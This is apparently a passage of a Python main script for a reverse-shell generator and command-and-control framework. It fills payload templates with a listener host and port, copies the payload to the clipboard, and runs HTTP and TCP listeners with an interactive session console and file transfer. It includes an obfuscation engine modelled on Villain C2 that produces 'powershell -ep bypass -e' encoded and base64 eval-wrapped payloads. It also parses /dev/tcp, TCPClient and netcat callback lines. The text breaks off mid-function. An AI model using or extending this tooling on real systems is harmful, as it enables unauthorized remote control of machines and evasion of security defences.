#!/usr/bin/env python3
"""
main.py
- Loads payload templates from payloads/linux.py and payloads/windows.py
- Validates user input (IP + HTTP/TCP ports)
- Generates payload (replaces {LHOST} and {LPORT})
- Prints payload in red and copies to clipboard
- Starts HTTP C2 + Raw TCP listener (from your listener code) bound to chosen HOST/ports
- Opens C2 console for interaction
"""

import importlib
import re
import socket
import sys
import threading
import time
from select import select
import argparse
import json
import base64
import os
import shutil
import shlex
from urllib.parse import urlparse, unquote, quote
from pathlib import Path
import uuid
from random import randint, choice, randrange
from string import ascii_uppercase, ascii_lowercase, digits
import glob

# Try to import readline for better terminal experience
try:
    import readline
except ImportError:
    readline = None

# Global verbose control system
GLOBAL_VERBOSE = False
FILE_TRANSFER_IN_PROGRESS = False
GLOBAL_LIST_MAP = {}
TERMINATED_SESSIONS = {}
ACTIVE_LISTENERS = {} # port -> service_type (http/tcp/upload/download)

def set_global_verbose(verbose):
    global GLOBAL_VERBOSE
    GLOBAL_VERBOSE = verbose

def set_file_transfer_mode(in_progress):
    global FILE_TRANSFER_IN_PROGRESS
    FILE_TRANSFER_IN_PROGRESS = in_progress

def quiet_print(message, always_show=False):
    """Print message only if in verbose mode or if always_show is True"""
    if always_show or GLOBAL_VERBOSE:
        print(message)

def parse_quoted_args(text):
    """Parse command line arguments handling both single and double quotes"""
    import shlex
    try:
        return shlex.split(text)
    except ValueError:
        # Fallback to simple parsing if shlex fails
        parts = []
        current = ''
        in_quotes = False
        quote_char = None
        
        for char in text:
            if char in ['"', "'"] and not in_quotes:
                in_quotes = True
                quote_char = char
            elif char == quote_char and in_quotes:
                in_quotes = False
                quote_char = None
            elif char == ' ' and not in_quotes:
                if current.strip():
                    parts.append(current.strip())
                current = ''
            else:
                current += char
        
        if current.strip():
            parts.append(current.strip())
        
        return parts


# external deps
from colorama import Fore, Style, init as colorama_init
import pyperclip

# init colorama
colorama_init(autoreset=True)

# -----------------------
# Utility / Validation
# -----------------------

def is_valid_ipv4(addr: str) -> bool:
    """Validate IPv4 address (0-255 per octet)."""
    if not addr or not isinstance(addr, str):
        return False
    parts = addr.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False

# -----------------
# Readline / Tab Completion
# -----------------

class C2Completer:
    def __init__(self):
        self.commands = ['#list', '#select', '#shell', '#send', '#receive', '#help', '#testfile', '#cleanup', '#status', '#repair', '#queue', '#stability', '#back', '#generate', '#exit']

    def complete(self, text, state):
        buffer = readline.get_line_buffer()
        line = buffer.strip()
        
        # If completing the command itself (first word)
        if ' ' not in buffer.lstrip():
            results = [c for c in self.commands if c.startswith(text)]
            return results[state] if state < len(results) else None
        
        # We are completing an argument
        parts = buffer.split()
        if not parts:
            return None
        
        cmd = parts[0].lower()
        
        # Path completion for #send and #receive (for -s= path)
        if cmd == '#send' or (cmd == '#receive' and '-s=' in text):
            # Extract the actual path fragment
            if '-s=' in text:
                prefix = text.split('-s=')[0] + '-s='
                path_fragment = text.split('-s=', 1)[1]
            else:
                prefix = ''
                # If we have '#send /path/to/fi', text is '/path/to/fi' because we set delimiters correctly
                path_fragment = text
            
            # Handle expanduser for glob
            search_path = os.path.expanduser(path_fragment)
            matches = glob.glob(search_path + '*')
            
            try:
                match = matches[state]
                if os.path.isdir(match) and not match.endswith('/'):
                    match += '/'
                
                # Restore original prefix style (like ~) if used
                if path_fragment.startswith('~'):
                    home = os.path.expanduser('~')
                    if match.startswith(home):
                        match = '~' + match[len(home):]
                
                return prefix + match
            except IndexError:
                return None
        
        # Session ID completion for #select and #shell
        if cmd in ('#select', '#shell', '#queue', '#testfile'):
            with global_lock:
                session_ids = [str(k) for k in GLOBAL_LIST_MAP.keys()]
            results = [s for s in session_ids if s.startswith(text)]
            return results[state] if state < len(results) else None
            
        return None

def setup_readline():
    if not readline:
        return
    
    # Set completer
    completer = C2Completer()
    readline.set_completer(completer.complete)
    
    # Configure delimiters: only use space, tab, and newline
    # This prevents paths from being split at '/' or '~'
    readline.set_completer_delims(' \t\n;')
    
    # Enable tab completion
    if 'libedit' in readline.__doc__:
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")
        
    # Setup history file
    histfile = os.path.join(os.path.expanduser("~"), ".revshell_history")
    try:
        if os.path.exists(histfile):
            readline.read_history_file(histfile)
        readline.set_history_length(1000)
    except Exception:
        pass
        
    # Save history on exit
    import atexit
    atexit.register(readline.write_history_file, histfile)

def strip_ansi(text: str) -> str:
    """Remove ANSI escape sequences from text"""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def can_bind(host: str, port: int) -> bool:
    """Check whether we can bind to (host, port). Returns True if bind succeeds (then we close)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.close()
        return True
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

def get_interface_ip(iface_name: str) -> str | None:
    """Resolve interface name to IP using socket IOCTL (Linux) or parsing ip command as fallback."""
    try:
        import fcntl
        import struct
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', iface_name[:15].encode('utf-8'))
        )[20:24])
    except Exception:
        # Fallback to parsing 'ip -o -4 addr show <iface>'
        try:
            import subprocess
            cmd = f"ip -o -4 addr show {iface_name}"
            output = subprocess.check_output(cmd, shell=True).decode('utf-8')
            # Extract IP from 'inet 1.2.3.4/24'
            match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', output)
            if match:
                return match.group(1)
        except Exception:
            pass
    return None

def resolve_lhost(input_val: str) -> str | None:
    """Resolve input to an IP. Input can be IPv4 or interface name."""
    if not input_val:
        return None
    val = input_val.strip()
    # Check if it's a valid IP first
    if is_valid_ipv4(val):
        return val
    # Check if it's a valid interface
    ip = get_interface_ip(val)
    if ip:
        return ip
    return None

def ask_ip(prompt="Enter LHOST (IPv4 or Interface Name): ") -> str:
    """Ask user for IP address or Interface with built-in resolution."""
    while True:
        v = input(prompt).strip()
        if not v:
            print("[!] Input cannot be empty.")
            continue
        
        resolved = resolve_lhost(v)
        if resolved:
            if resolved != v:
                print(f"[*] Resolved interface '{v}' to IP {resolved}")
            return resolved
        
        print("[!] Invalid IPv4 address or Interface name. Double check your input.")

def ask_port(prompt="Enter port (1-65535): ") -> int:
    """Ask user for port number with built-in validation and binding check - self-contained function."""
    while True:
        v = input(prompt).strip()
        if not v:
            print("[!] Input cannot be empty.")
            continue
        if not v.isdigit():
            print("[!] Port must be numeric.")
            continue
        
        try:
            p = int(v)
        except ValueError:
            print("[!] Port must be numeric.")
            continue
        
        if not (1 <= p <= 65535):
            print("[!] Port must be between 1 and 65535.")
            continue
        
        if p <= 1024:
            yn = input("[!] Ports 1-1024 require root/admin privileges to bind. Continue with this port? (y/N): ").strip().lower()
            if yn != "y":
                continue
        
        # Built-in port binding check - no external dependencies
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', p))  # Test binding to all interfaces
            s.close()
            return p
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            print(f"[!] Port {p} is not available for binding. Please choose another port.")
            continue

def ask_choice(prompt: str, options: list) -> str:
    """Ask user to choose from a list of options with built-in validation - self-contained function."""
    if not options or not isinstance(options, list):
        raise ValueError("Options list cannot be empty")
    
    # Create case-insensitive mapping while preserving original case
    opts_lower = [str(o).lower() for o in options]
    options_map = {str(o).lower(): str(o) for o in options}
    
    while True:
        v = input(prompt).strip()
        if not v:
            print("[!] Input cannot be empty.")
            continue
        
        v_lower = v.lower()
        if v_lower not in opts_lower:
            print(f"[!] Invalid option. Choose from: {', '.join(options)}")
            continue
        
        # Return the canonical option string from options (preserve case)
        return options_map[v_lower]

def normalize_os_choice(flag: str) -> str:
    if not flag:
        return None
    val = flag.strip().lower()
    if val in ("w", "win", "windows"):
        return "Windows"
    if val in ("l", "lin", "linux"):
        return "Linux"
    return None

def normalize_connection(flag: str) -> str:
    if not flag:
        return None
    val = flag.strip().lower()
    if val in ("tcp", "http"):
        return val
    return None

def normalize_crypto(flag: str) -> str | None:
    """Map user flag to 'encode' or 'obfuscation' or None."""
    if not flag:
        return None
    v = flag.strip().lower()
    if v in ("encode", "encoding", "base64", "b64"):
        return "encode"
    if v in ("obfuscation", "obfuscate", "obf", "obs"):
        return "obfuscate"
    if v in ("none", "off"):
        return None
    # If we get here, it's an invalid option
    return "invalid"

def load_custom_payloads(os_choice: str) -> dict:
    """Load custom payloads for the OS - self-contained function with built-in path resolution."""
    # Built-in path resolution - no external dependencies
    base_dir = os.path.dirname(os.path.abspath(__file__))
    filename = "custom_windows.json" if os_choice == "Windows" else "custom_linux.json"
    path = os.path.join(base_dir, "payloads", filename)

    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict):
                return data
            return {}
    except FileNotFoundError:
        return {}
    except Exception:
        return {}

def save_custom_payload(os_choice: str, name: str, template: str, connection: str) -> None:
    """Save custom payload - self-contained function with built-in path resolution."""
    # Built-in path resolution - no external dependencies
    base_dir = os.path.dirname(os.path.abspath(__file__))
    filename = "custom_windows.json" if os_choice == "Windows" else "custom_linux.json"
    path = os.path.join(base_dir, "payloads", filename)
    
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(path), exist_ok=True)
    
    # Load existing payloads
    current = load_custom_payloads(os_choice)
    current[name] = {"template": template, "con": connection}
    
    # Save to file
    with open(path, "w", encoding="utf-8") as f:
        json.dump(current, f, indent=2)

def merge_builtins_and_customs(builtins: dict, customs: dict) -> dict:
    """Return a new dict name->template (customs override builtins on key collision)."""
    merged = dict(builtins or {})
    for name, entry in (customs or {}).items():
        if isinstance(entry, dict) and "template" in entry:
            merged[name] = entry["template"]
        elif isinstance(entry, str):
            merged[name] = entry
    return merged

def list_keys_filtered_by_connection(builtins: dict, customs: dict, connection: str) -> list:
    """Return sorted list of keys whose connection matches the requested connection - self-contained function."""
    def infer_connection_type(template: str) -> str:
        """Built-in connection type inference - no external dependencies."""
        if not template:
            return "tcp"
        low = str(template).lower()
        if any(indicator in low for indicator in ["http://", "https://", "invoke-webrequest", "iwr ", "curl ", "wget "]):
            return "http"
        return "tcp"
    
    keys = []
    seen = set()
    
    # built-ins by inference
    for k, tmpl in (builtins or {}).items():
        if k in seen:
            continue
        conn = infer_connection_type(tmpl)
        if conn == connection:
            keys.append(k)
            seen.add(k)
    
    # customs by explicit meta or inference fallback
    for k, entry in (customs or {}).items():
        if k in seen:
            continue
        if isinstance(entry, dict):
            conn = entry.get("con") or infer_connection_type(entry.get("template", ""))
        else:
            conn = infer_connection_type(str(entry))
        if conn == connection:
            keys.append(k)
            seen.add(k)
    
    return sorted(keys)






# -----------------------
# Payload loader/generator
# -----------------------
def load_payload_module(os_choice: str):
    """Dynamically import payloads.<os_choice>"""
    try:
        module = importlib.import_module(f"payloads.{os_choice.lower()}")
        if not hasattr(module, "payloads") or not isinstance(module.payloads, dict):
            raise ImportError(f"payloads.{os_choice.lower()} does not define a 'payloads' dict")
        return module
    except Exception as e:
        raise ImportError(f"Failed to load payload module for {os_choice}: {e}")

def generate_http_uid() -> str:
    """Generate a random 2-part hex UID for HTTP implants (e.g. 5a2b8e31-9f1c72d0)"""
    return f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:8]}"

def generate_payload_text(module, payload_key: str, lhost: str, lport: int) -> str:
    """Replace placeholders in template with LHOST/LPORT/UID and return final payload string."""
    if payload_key not in module.payloads:
        raise KeyError(f"Payload '{payload_key}' not found in module.")
    template = module.payloads[payload_key]
    
    # Generate a fresh UID for this instance
    uid = generate_http_uid()
    
    # replace placeholders robustly
    payload = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport)).replace("{UID}", uid)
    return payload

# -----------------------
# Custom payload storage / helpers
# -----------------------





def read_payload_source(maybe_path: str) -> str:
    """Return file contents if maybe_path points to a readable file (supports @file), else return the string itself."""
    if not isinstance(maybe_path, str) or not maybe_path.strip():
        return maybe_path
    candidate = maybe_path.strip()
    if candidate.startswith("@"):
        candidate = candidate[1:].strip()
    expanded = os.path.expanduser(candidate)
    try_paths = [expanded, os.path.abspath(expanded)]
    for p in try_paths:
        try:
            if os.path.isfile(p):
                with open(p, "r", encoding="utf-8", errors="ignore") as f:
                    return f.read()
        except Exception:
            pass
    return maybe_path


def extract_host_port(payload_text: str) -> tuple[str | None, int | None]:
    """Best-effort extraction of host and port from payload text.
    Prefers IPv4 candidates. Returns (host, port) or (None, None) if not found.
    """
    if not isinstance(payload_text, str) or not payload_text:
        return (None, None)
    text = payload_text
    host_port_pairs: list[tuple[str, int]] = []
    hosts: list[str] = []
    ports: list[int] = []

    def add_pair(h: str, p: str | int):
        try:
            pi = int(p)
            if 1 <= pi <= 65535:
                host_port_pairs.append((h, pi))
        except Exception:
            return

    # /dev/tcp/HOST/PORT
    for h, p in re.findall(r"/dev/tcp/([A-Za-z0-9\-.]+)/([0-9]{1,5})", text):
        add_pair(h, p)

    # TCPClient('HOST', PORT)
    for h, p in re.findall(r"(?i)TCPClient\(\s*['\"]([^'\"]+)['\"]\s*,\s*([0-9]{1,5})\s*\)", text):
        add_pair(h, p)

    # Generic HOST:PORT (includes $s='host:port')
    for h, p in re.findall(r"\b([A-Za-z0-9\-.]+)\s*:\s*([0-9]{1,5})\b", text):
        add_pair(h, p)

    # HTTP URLs
    for h, p in re.findall(r"(?i)https?://([A-Za-z0-9\-.]+)(?::([0-9]{1,5}))?", text):
        if p:
            add_pair(h, p)
        else:
            hosts.append(h)

    # nc host port
    for h, p in re.findall(r"(?i)\bnc(?:at)?\b[^\n]*?\s([A-Za-z0-9\-.]+)\s+([0-9]{1,5})\b", text):
        add_pair(h, p)

    # Variable assignments
    for h in re.findall(r"\$LHOST\s*=\s*['\"]([^'\"]+)['\"]", text):
        hosts.append(h)
    for p in re.findall(r"\$LPORT\s*=\s*([0-9]{1,5})\b", text):
        try:
            ports.append(int(p))
        except Exception:
            pass

    # BRUTE-FORCE ADDITIONAL SCANS
    # IPv4 dotted-quad anywhere
    for cand in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text):
        if is_valid_ipv4(cand):
            hosts.append(cand)
    # Numeric tokens as ports (prefer 4-5 digits, but accept 1-5)
    numeric_tokens = re.findall(r"\b\d{1,5}\b", text)
    for tok in numeric_tokens:
        try:
            val = int(tok)
            if 1 <= val <= 65535:
                ports.append(val)
        except Exception:
            pass

    # Choose host
    chosen_host = None
    # Prefer host from pairs that is IPv4
    for h, _ in host_port_pairs:
        if is_valid_ipv4(h):
            chosen_host = h
            break
    if chosen_host is None:
        # Next, any IPv4 from hosts list
        for h in hosts:
            if is_valid_ipv4(h):
                chosen_host = h
                break
    if chosen_host is None and host_port_pairs:
        chosen_host = host_port_pairs[0][0]
    if chosen_host is None and hosts:
        chosen_host = hosts[0]

    # Choose port (prefer 4-5 digit tokens if available)
    chosen_port = None
    if host_port_pairs:
        chosen_port = host_port_pairs[0][1]
    if chosen_port is None and ports:
        # prefer 4-5 digits
        long_ports = [p for p in ports if p >= 1000]
        chosen_port = (long_ports[0] if long_ports else ports[0])

    return (chosen_host, chosen_port)


def template_payload_content(raw: str, lhost: str, lport: int) -> str:
    try:
        port_str = str(lport)
        host_re = re.escape(lhost)
        port_re = re.escape(port_str)
        out = raw
        # 1) Replace host+port occurrences first (e.g., 10.0.0.1:4444 or 10.0.0.1/4444)
        out = re.sub(rf'({host_re})(:|/){port_re}', r'{LHOST}\2{LPORT}', out)
        # 2) Replace standalone host (constants) with placeholder
        out = re.sub(host_re, '{LHOST}', out)
        # 3) Replace port in common explicit contexts using the provided lport
        #    - after ':' or '/'
        out = re.sub(rf'(?<=:){port_re}(?!\d)', '{LPORT}', out)
        out = re.sub(rf'(?<=/){port_re}(?!\d)', '{LPORT}', out)
        #    - after '=' allowing optional whitespace (keep '=')
        out = re.sub(rf'(=)\s*{port_re}(?!\d)', r'\1{LPORT}', out)
        #    - after ',' allowing optional whitespace (argument lists)
        out = re.sub(rf'(?<=,)\s*{port_re}(?!\d)', '{LPORT}', out)
        #    - quoted numbers
        out = re.sub(rf'([""])\s*{port_re}\s*([""])', r'\1{LPORT}\2', out)
        #    - standalone numeric token
        out = re.sub(rf'(?<!\d){port_re}(?!\d)', '{LPORT}', out)

        # 4) Heuristic replacements if no {LPORT} yet (cover hard-coded ports not matching user-provided lport)
        if '{LPORT}' not in out:
            # a) PowerShell-style: $LPORT = 4444
            out = re.sub(r'(\$LPORT\s*=\s*)\d{1,5}', r'\1{LPORT}', out)
        if '{LPORT}' not in out:
            # b) TCPClient(host, 4444)
            out = re.sub(r'(?i)(TCPClient\([^,]+,\s*)\d{1,5}', r'\1{LPORT}', out)
        if '{LPORT}' not in out:
            # c) After {LHOST} or $LHOST separated by comma
            out = re.sub(r'(\{LHOST\}|\$LHOST)\s*,\s*\d{1,5}', r'\1,{LPORT}', out)
        if '{LPORT}' not in out:
            # d) {LHOST}:4444 or {LHOST}/4444
            out = re.sub(r'(\{LHOST\})(:|/)\d{1,5}', r'\1\2{LPORT}', out)
        if '{LPORT}' not in out:
            # e) Netcat-like: "... {LHOST} 4444 ..."
            out = re.sub(r'(\{LHOST\})\s+\d{1,5}', r'\1 {LPORT}', out)

        return out
    except Exception:
        # Fallback (naive) replacement
        return raw.replace(lhost, '{LHOST}').replace(str(lport), '{LPORT}')


class AdvancedObfuscator:
    """Advanced obfuscation engine inspired by Villain C2 framework"""
    
    def __init__(self):
        self.restricted_var_names = ['t', 'tr', 'tru', 'true', 'e', 'en', 'env']
        self.used_var_names = []
    
    def mask_char(self, char):
        """Mask individual characters with regex patterns"""
        path = randint(1, 3)
        
        if char.isalpha():
            if path == 1:
                return char
            return '\\w' if path == 2 else f'({char}|\\?)'
        elif char.isnumeric():
            if path == 1:
                return char
            return '\\d' if path == 2 else f'({char}|\\?)'
        elif char in '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~':
            if char in ['$^*\\+?']:
                char = '\\' + char
            if path == 1:
                return char
            return '\\W' if path == 2 else f'({char}|\\?)'
        else:
            return None
    
    def randomize_case(self, string):
        """Randomize case of each character"""
        return ''.join(choice((str.upper, str.lower))(c) for c in string)
    
    def string_to_regex(self, string):
        """Convert string to complex regex pattern"""
        if re.match(r"^\\\[.*\\\]$", string):
            return string
        
        legal = False
        while not legal:
            regex = ''
            str_length = len(string)
            chars_used = 0
            c = 0
            
            while True:
                chars_left = (str_length - chars_used)
                if chars_left:
                    pair_length = randint(1, chars_left)
                    regex += '['
                    
                    for i in range(c, pair_length + c):
                        masked = self.mask_char(string[i])
                        regex += masked
                        c += 1
                    
                    chars_used += pair_length
                    regex += ']{' + str(pair_length) + '}'
                else:
                    break
            
            # Test generated regex
            if re.match(regex, string):
                legal = True
        
        return regex
    
    def concatenate_string(self, string):
        """Split string into concatenated parts"""
        str_length = len(string)
        if str_length <= 1:
            return string
        
        concat = ''
        chars_used = 0
        c = 0
        
        while True:
            chars_left = (str_length - chars_used)
            if chars_left:
                pair_length = randint(1, chars_left)
                concat += "'"
                
                for i in range(c, pair_length + c):
                    concat += string[i]
                    c += 1
                
                chars_used += pair_length
                concat = (concat + "'+") if (chars_used < str_length) else (concat + "'")
            else:
                break
        
        return concat
    
    def get_random_str(self, main_str, substr_len):
        """Extract random substring"""
        index = randrange(1, len(main_str) - substr_len + 1)
        return main_str[index : (index + substr_len)]
    
    def obfuscate_cmdlet(self, main_str):
        """Obfuscate cmdlet by quoting part of it"""
        main_str_length = len(main_str)
        substr_len = main_str_length - (randint(1, (main_str_length - 2)))
        sub = self.get_random_str(main_str, substr_len)
        sub_quoted = f"'{sub}'"
        obf_cmdlet = main_str.replace(sub, sub_quoted)
        return obf_cmdlet
    
    def get_rand_var_name(self):
        """Generate random variable name"""
        _max = randint(1, 6)
        legal = False
        
        while not legal:
            obf = str(uuid.uuid4())[0:_max]
            if (obf in self.restricted_var_names) or (obf in self.used_var_names):
                continue
            else:
                self.used_var_names.append(obf)
                legal = True
        
        return obf
    
    def mask_payload(self, payload):
        """Apply minimal obfuscation that preserves PowerShell syntax completely"""
        try:
            # Method 1: Only safe cmdlet aliasing (most reliable)
            alternatives = {
                'Invoke-WebRequest': 'iwr',
                'Invoke-Expression': 'iex', 
                'Invoke-RestMethod': 'irm'
            }
            
            for alt in alternatives.keys():
                if randint(0, 1) == 0:  # 50% chance
                    payload = payload.replace(alt, alternatives[alt])
            
            # Method 2: Only obfuscate simple strings (very safe)
            strings = re.findall(r"'([^']{1,8})'", payload)  # Only very short strings
            if strings:
                for string in strings:
                    if string in ['None', 'quit'] and len(string) < 8:
                        string = string.strip("'")
                        concat = self.concatenate_string(string)
                        payload = payload.replace(f"'{string}'", f'({concat})')
            
            # Skip parameter case randomization - it breaks PowerShell syntax
            # Skip execution policy bypass - it's already handled by encode_utf16
            
            self.used_var_names = []
            return payload
            
        except Exception:
            # Ultimate fallback - return original payload if everything fails
            return payload

def encode_utf16(payload):
    """Villain-style UTF-16 encoding with BOM removal"""
    enc_payload = "powershell -ep bypass -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    return enc_payload

def obfuscate_payload(os_choice: str, payload_text: str) -> str:
    """Return an obfuscated wrapper that reconstructs and executes the payload at runtime.
    Uses ultra-conservative obfuscation techniques that preserve PowerShell syntax.
    """
    if os_choice == "Windows":
        # Apply ultra-conservative obfuscation
        obfuscator = AdvancedObfuscator()
        obfuscated_payload = obfuscator.mask_payload(payload_text)
        
        # Encode with UTF-16
        return encode_utf16(obfuscated_payload)
    else:
        # Linux/Unix - use base64 with eval
        try:
            b64 = base64.b64encode(payload_text.encode('utf-8')).decode('utf-8')
        except Exception:
            b64 = payload_text
        return f"eval \"$(echo '{b64}' | base64 -d)\""






def find_available_port(host: str, start_port: int, limit: int = 50, exclude: list = None) -> int:
    """Return start_port if bindable and not in exclude, else scan up to start_port+limit for a free port."""
    if exclude is None:
        exclude = []
        
    for p in range(start_port, start_port + 1 + limit):
        if p in exclude:
            continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, p))
            s.close()
            return p
        except Exception:
            try:
                s.close()
            except Exception:
                pass
    return None

# -----------------------
# C2 / Listener code (adapted from your listener)
# -----------------------
# Globals populated after user input
HOST = None
HTTP_PORT = None
RAW_TCP_PORT = None
# Dynamic timeout system (Villain-style)
# Base timeout values (will be adjusted based on session stability)
BASE_TIMEOUT = 60  # Base timeout in seconds
STABLE_TIMEOUT = 60  # Timeout for stable sessions
UNSTABLE_TIMEOUT = 180  # Timeout for unstable sessions
FILE_TRANSFER_TIMEOUT = 600  # Extended timeout for file transfers (10 minutes)
BUSY_TIMEOUT = 120  # Timeout for busy sessions

# Session stability scoring
STABILITY_THRESHOLD_LOW = 0.3  # Below this = unstable
STABILITY_THRESHOLD_HIGH = 0.7  # Above this = stable

# Track selected OS to tailor HTTP command behavior
OS_CHOICE = None

# File transfer settings
FILE_UPLOAD_PORT = None
FILE_DOWNLOAD_PORT = None
DOWNLOAD_DIR = None

http_sessions = {}
shell_sessions = {}
current_session = None
global_lock = threading.Lock()
download_mappings = {}
pending_upload_save_path = None

# When set to a shell_id, the console is in raw interactive mode with that shell
interactive_shell_active_for_id = None
# Fallback line-mode interaction (no raw TTY)
line_mode_shell_id = None

import http.server
import socketserver
import termios
import tty
import threading
import math

class FileTransferProgress:
    """Comprehensive progress tracking for file transfers with speed calculation and ETA"""
    
    def __init__(self, total_size: int, filename: str, transfer_type: str = "unknown"):
        self.total_size = total_size
        self.filename = filename
        self.transfer_type = transfer_type  # "send" or "receive"
        self.bytes_transferred = 0
        self.start_time = time.time()
        self.last_update_time = self.start_time
        self.last_bytes = 0
        self.speed_history = []
        self.lock = threading.Lock()
        self.completed = False
        self.last_progress_time = self.start_time  # Track when we last got progress updates
        
    def update(self, bytes_transferred: int):
        """Update progress with new bytes transferred"""
        with self.lock:
            current_time = time.time()
            self.bytes_transferred = bytes_transferred
            self.last_progress_time = current_time  # Update progress time
            
            # Calculate speed (bytes per second)
            time_delta = current_time - self.last_update_time
            if time_delta > 0:
                bytes_delta = bytes_transferred - self.last_bytes
                current_speed = bytes_delta / time_delta
                self.speed_history.append(current_speed)
                
                # Keep only last 10 speed measurements for smoothing
                if len(self.speed_history) > 10:
                    self.speed_history.pop(0)
            
            self.last_update_time = current_time
            self.last_bytes = bytes_transferred
    
    def get_progress_info(self):
        """Get formatted progress information"""
        with self.lock:
            if self.total_size <= 0:
                return "Progress: Unknown size"
            
            # Calculate percentage
            percentage = min(100, (self.bytes_transferred / self.total_size) * 100)
            
            # Calculate average speed based on total elapsed time and bytes transferred
            # This gives a more accurate overall speed rather than instant speed
            elapsed_time = time.time() - self.start_time
            if elapsed_time > 0 and self.bytes_transferred > 0:
                avg_speed = self.bytes_transferred / elapsed_time
            else:
                avg_speed = 0
            
            # Calculate ETA
            eta_seconds = 0
            if avg_speed > 0 and self.bytes_transferred < self.total_size:
                remaining_bytes = self.total_size - self.bytes_transferred
                eta_seconds = remaining_bytes / avg_speed
            
            # Determine if we should use bytes, KB, or MB based on total size
            if self.total_size < 1024:  # Less than 1KB
                # Use bytes for very small files
                total_size_display = self.total_size
                transferred_size_display = self.bytes_transferred
                remaining_size_display = self.total_size - self.bytes_transferred
                size_unit = "B"
            elif self.total_size < (1024 * 1024):  # Less than 1MB
                # Use KB for small files
                total_size_display = self.total_size / 1024
                transferred_size_display = self.bytes_transferred / 1024
                remaining_size_display = (self.total_size - self.bytes_transferred) / 1024
                size_unit = "KB"
            else:
                # Use MB for larger files
                total_size_display = self.total_size / (1024 * 1024)
                transferred_size_display = self.bytes_transferred / (1024 * 1024)
                remaining_size_display = (self.total_size - self.bytes_transferred) / (1024 * 1024)
                size_unit = "MB"
            
            # Determine speed unit based on actual speed (not file size)
            if avg_speed < 1024:  # Less than 1 KB/s
                speed_display = avg_speed
                speed_unit = "B/s"
            elif avg_speed < (1024 * 1024):  # Less than 1 MB/s
                speed_display = avg_speed / 1024
                speed_unit = "KB/s"
            else:
                speed_display = avg_speed / (1024 * 1024)
                speed_unit = "MB/s"
            
            # Format time
            eta_str = self._format_time(eta_seconds)
            elapsed_str = self._format_time(time.time() - self.start_time)
            
            # Create progress bar
            bar_width = 30
            filled = int((percentage / 100) * bar_width)
            bar = "█" * filled + "░" * (bar_width - filled)
            
            return {
                'percentage': percentage,
                'bar': bar,
                'transferred_size': transferred_size_display,
                'total_size': total_size_display,
                'remaining_size': remaining_size_display,
                'speed': speed_display,
                'size_unit': size_unit,
                'speed_unit': speed_unit,
                'eta': eta_str,
                'elapsed': elapsed_str,
                'bytes_transferred': self.bytes_transferred,
                'total_bytes': self.total_size
            }
    
    def _format_time(self, seconds):
        """Format seconds into human readable time"""
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            return f"{seconds/60:.1f}m"
        else:
            return f"{seconds/3600:.1f}h"
    
    def display_progress(self, force_show=False):
        """Display progress bar - always show during file transfers"""
        # Always show progress bar during file transfers, regardless of verbose mode
        
        # Aggressive throttling to prevent performance issues - allow force_show to bypass
        current_time = time.time()
        if not force_show and hasattr(self, '_last_display_time') and current_time - self._last_display_time < 0.2:
            return  # Don't update more than 5 times per second unless forced
        self._last_display_time = current_time
        
        info = self.get_progress_info()
        
        # Get terminal width for dynamic progress bar sizing
        try:
            import shutil
            terminal_width = shutil.get_terminal_size().columns
        except:
            terminal_width = 80  # Fallback to 80 columns
        
        # Create different display formats based on terminal width
        if terminal_width >= 100:
            # Wide terminal - full display
            bar_width = 30
            filled = int((info['percentage'] / 100) * bar_width)
            bar = "█" * filled + "░" * (bar_width - filled)
            progress_line = (
                f"\r[{self.transfer_type.upper()}] {self.filename} | "
                f"[{bar}] {info['percentage']:.1f}% | "
                f"{info['transferred_size']:.1f}{info['size_unit']}/{info['total_size']:.1f}{info['size_unit']} | "
                f"{info['speed']:.1f}{info['speed_unit']} | "
                f"ETA: {info['eta']} | "
                f"Elapsed: {info['elapsed']}"
            )
        elif terminal_width >= 80:
            # Medium terminal - shorter bar
            bar_width = 20
            filled = int((info['percentage'] / 100) * bar_width)
            bar = "█" * filled + "░" * (bar_width - filled)
            progress_line = (
                f"\r[{self.transfer_type.upper()}] {self.filename} | "
                f"[{bar}] {info['percentage']:.1f}% | "
                f"{info['transferred_size']:.1f}{info['size_unit']}/{info['total_size']:.1f}{info['size_unit']} | "
                f"{info['speed']:.1f}{info['speed_unit']} | "
                f"ETA: {info['eta']} | "
                f"Elapsed: {info['elapsed']}"
            )
        elif terminal_width >= 60:
            # Narrow terminal - compact format
            bar_width = 15
            filled = int((info['percentage'] / 100) * bar_width)
            bar = "█" * filled + "░" * (bar_width - filled)
            compact_filename = self.filename[:25] + "..." if len(self.filename) > 25 else self.filename
            progress_line = (
                f"\r[{self.transfer_type.upper()}] {compact_filename} | "
                f"[{bar}] {info['percentage']:.1f}% | "
                f"{info['transferred_size']:.1f}{info['size_unit']}/{info['total_size']:.1f}{info['size_unit']} | "
                f"{info['speed']:.1f}{info['speed_unit']} | "
                f"ETA: {info['eta']} | "
                f"Elapsed: {info['elapsed']}"
            )
        else:
            # Very narrow terminal - ultra compact format
            bar_width = 10
            filled = int((info['percentage'] / 100) * bar_width)
